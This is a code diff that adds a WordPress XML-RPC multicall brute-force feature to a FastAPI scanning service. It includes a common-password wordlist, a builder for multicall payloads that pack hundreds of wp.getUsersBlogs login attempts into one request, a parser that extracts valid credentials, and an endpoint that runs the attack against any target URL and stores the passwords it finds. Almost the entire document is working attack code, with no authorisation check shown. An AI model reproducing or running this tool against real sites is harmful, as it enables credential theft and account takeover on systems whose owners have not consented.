@@ -898,6 +898,308 @@ async def get_scan_by_id(scan_id: str):
         raise HTTPException(status_code=500, detail=str(e))
 
 
+# ==========================================
+# XMLRPC MULTICALL BRUTE FORCE
+# ==========================================
+
+# Common password wordlist for testing
+DEFAULT_PASSWORDS = [
+    "123456", "password", "12345678", "qwerty", "123456789",
+    "12345", "1234", "111111", "1234567", "dragon",
+    "123123", "baseball", "abc123", "football", "monkey",
+    "letmein", "696969", "shadow", "master", "666666",
+    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
+    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
+    "fuckyou", "121212", "000000", "qazwsx", "123qwe",
+    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
+    "asdfgh", "hunter", "buster", "soccer", "harley",
+    "batman", "andrew", "tigger", "sunshine", "iloveyou",
+    "fuckme", "2000", "charlie", "robert", "thomas",
+    "hockey", "ranger", "daniel", "starwars", "klaster",
+    "112233", "george", "asshole", "computer", "michelle",
+    "jessica", "pepper", "1111", "zxcvbn", "555555",
+    "11111111", "131313", "freedom", "777777", "pass",
+    "fuck", "maggie", "159753", "aaaaaa", "ginger",
+    "princess", "joshua", "cheese", "amanda", "summer",
+    "love", "ashley", "6969", "nicole", "chelsea",
+    "biteme", "matthew", "access", "yankees", "987654321",
+    "dallas", "austin", "thunder", "taylor", "matrix",
+    "admin", "administrator", "root", "toor", "pass123",
+    "admin123", "root123", "password123", "test", "test123",
+    "guest", "guest123", "user", "user123", "demo",
+    "wordpress", "wp", "wpadmin", "wpadmin123"
+]
+
+class BruteForceRequest(BaseModel):
+    target_url: str
+    usernames: List[str]
+    passwords: Optional[List[str]] = None
+    use_default_wordlist: bool = True
+    batch_size: int = 100  # passwords per multicall request
+
+class BruteForceResult(BaseModel):
+    model_config = ConfigDict(extra="ignore")
+    
+    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
+    target_url: str
+    started_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
+    finished_at: Optional[datetime] = None
+    total_attempts: int = 0
+    credentials_found: List[Dict[str, str]] = []
+    xmlrpc_enabled: bool = False
+    multicall_enabled: bool = False
+    status: str = "running"
+    error: Optional[str] = None
+
+
+def build_multicall_payload(username: str, passwords: List[str]) -> str:
+    """Build XML-RPC multicall payload for brute force"""
+    method_calls = ""
+    for pwd in passwords:
+        method_calls += f"""
+        <value>
+            <struct>
+                <member>
+                    <name>methodName</name>
+                    <value><string>wp.getUsersBlogs</string></value>
+                </member>
+                <member>
+                    <name>params</name>
+                    <value>
+                        <array>
+                            <data>
+                                <value><string>{username}</string></value>
+                                <value><string>{pwd}</string></value>
+                            </data>
+                        </array>
+                    </value>
+                </member>
+            </struct>
+        </value>"""
+    
+    return f"""<?xml version="1.0"?>
+<methodCall>
+    <methodName>system.multicall</methodName>
+    <params>
+        <param>
+            <value>
+                <array>
+                    <data>{method_calls}
+                    </data>
+                </array>
+            </value>
+        </param>
+    </params>
+</methodCall>"""
+
+
+def parse_multicall_response(response_text: str, passwords: List[str]) -> List[Dict]:
+    """Parse multicall response to find successful logins"""
+    found = []
+    
+    # Look for successful responses (contains blog info, not faultCode)
+    # Split response by methodResponse or value tags
+    responses = re.findall(r'<value>(.*?)</value>', response_text, re.DOTALL)
+    
+    for i, resp in enumerate(responses):
+        if i < len(passwords):
+            # Check if this is a successful response (contains blogid or isAdmin)
+            if ('blogid' in resp.lower() or 'isadmin' in resp.lower() or 
+                ('array' in resp.lower() and 'faultcode' not in resp.lower())):
+                # Check it's not an error
+                if 'faultcode' not in resp.lower() and 'incorrect' not in resp.lower():
+                    found.append({"password": passwords[i], "response_snippet": resp[:200]})
+    
+    return found
+
+
+async def check_xmlrpc_multicall(client: httpx.AsyncClient, base_url: str) -> tuple:
+    """Check if XMLRPC and multicall are enabled"""
+    xmlrpc_enabled = False
+    multicall_enabled = False
+    
+    try:
+        # Check XMLRPC
+        resp = await client.post(
+            f"{base_url}/xmlrpc.php",
+            content='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
+            headers={"Content-Type": "text/xml"},
+            timeout=10
+        )
+        
+        if resp.status_code == 200 and 'methodresponse' in resp.text.lower():
+            xmlrpc_enabled = True
+            if 'system.multicall' in resp.text:
+                multicall_enabled = True
+                
+    except Exception as e:
+        logging.error(f"XMLRPC check error: {e}")
+    
+    return xmlrpc_enabled, multicall_enabled
+
+
+@api_router.post("/bruteforce/start")
+async def start_bruteforce(request: BruteForceRequest):
+    """Start XMLRPC multicall brute force attack"""
+    try:
+        base_url = normalize_url(request.target_url)
+        
+        # Prepare password list
+        passwords = []
+        if request.use_default_wordlist:
+            passwords.extend(DEFAULT_PASSWORDS)
+        if request.passwords:
+            passwords.extend(request.passwords)
+        
+        # Remove duplicates
+        passwords = list(dict.fromkeys(passwords))
+        
+        result = {
+            "id": str(uuid.uuid4()),
+            "target_url": base_url,
+            "started_at": datetime.now(timezone.utc),
+            "finished_at": None,
+            "total_attempts": 0,
+            "credentials_found": [],
+            "xmlrpc_enabled": False,
+            "multicall_enabled": False,
+            "status": "running",
+            "error": None,
+            "progress": [],
+            "usernames_tested": request.usernames,
+            "passwords_count": len(passwords)
+        }
+        
+        async with httpx.AsyncClient(
+            timeout=60,
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Content-Type": "text/xml"
+            },
+            verify=False
+        ) as client:
+            
+            # Check XMLRPC status
+            xmlrpc_enabled, multicall_enabled = await check_xmlrpc_multicall(client, base_url)
+            result["xmlrpc_enabled"] = xmlrpc_enabled
+            result["multicall_enabled"] = multicall_enabled
+            
+            if not xmlrpc_enabled:
+                result["status"] = "failed"
+                result["error"] = "XMLRPC is disabled on target"
+                result["finished_at"] = datetime.now(timezone.utc)
+                return result
+            
+            if not multicall_enabled:
+                result["status"] = "failed"
+                result["error"] = "system.multicall is not available"
+                result["finished_at"] = datetime.now(timezone.utc)
+                return result
+            
+            # Start brute force for each username
+            for username in request.usernames:
+                result["progress"].append({"username": username, "status": "testing", "found": False})
+                
+                # Split passwords into batches
+                batch_size = min(request.batch_size, 500)  # Max 500 per request
+                
+                for i in range(0, len(passwords), batch_size):
+                    batch = passwords[i:i + batch_size]
+                    
+                    # Build and send multicall request
+                    payload = build_multicall_payload(username, batch)
+                    
+                    try:
+                        resp = await client.post(
+                            f"{base_url}/xmlrpc.php",
+                            content=payload,
+                            timeout=30
+                        )
+                        
+                        result["total_attempts"] += len(batch)
+                        
+                        if resp.status_code == 200:
+                            # Parse response for successful logins
+                            found = parse_multicall_response(resp.text, batch)
+                            
+                            for f in found:
+                                cred = {
+                                    "username": username,
+                                    "password": f["password"],
+                                    "found_at": datetime.now(timezone.utc).isoformat()
+                                }
+                                result["credentials_found"].append(cred)
+                                
+                                # Update progress
+                                for p in result["progress"]:
+                                    if p["username"] == username:
+                                        p["found"] = True
+                                        p["password"] = f["password"]
+                                
+                        # Small delay to avoid overwhelming server
+                        await asyncio.sleep(0.5)
+                        
+                    except Exception as e:
+                        logging.error(f"Batch request error: {e}")
+                        continue
+                
+                # Update progress status
+                for p in result["progress"]:
+                    if p["username"] == username:
+                        p["status"] = "completed"
+            
+            result["status"] = "completed"
+            result["finished_at"] = datetime.now(timezone.utc)
+            
+            # Save to database
+            doc = result.copy()
+            doc['started_at'] = doc['started_at'].isoformat()
+            if doc['finished_at']:
+                doc['finished_at'] = doc['finished_at'].isoformat()
+            await db.bruteforce_results.insert_one(doc)
+            
+            return result
+            
+    except Exception as e:
+        logging.error(f"Brute force error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@api_router.get("/bruteforce/history")
+async def get_bruteforce_history():
+    """Get brute force attack history"""
+    try:
+        results = await db.bruteforce_results.find(
+            {},
+            {"_id": 0, "progress": 0}
+        ).sort("started_at", -1).to_list(50)
+        return results
+    except Exception as e:
+        logging.error(f"Error fetching history: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@api_router.get("/bruteforce/{result_id}")
+async def get_bruteforce_result(result_id: str):
+    """Get specific brute force result"""
+    try:
+        result = await db.bruteforce_results.find_one({"id": result_id}, {"_id": 0})
+        if not result:
+            raise HTTPException(status_code=404, detail="Result not found")
+        return result
+    except HTTPException:
+        raise
+    except Exception as e:
+        logging.error(f"Error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@api_router.get("/wordlist")
+async def get_default_wordlist():
+    """Get default password wordlist"""
+    return {"passwords": DEFAULT_PASSWORDS, "count": len(DEFAULT_PASSWORDS)}
+
+
 # Include the router in the main app
 app.include_router(api_router)
 
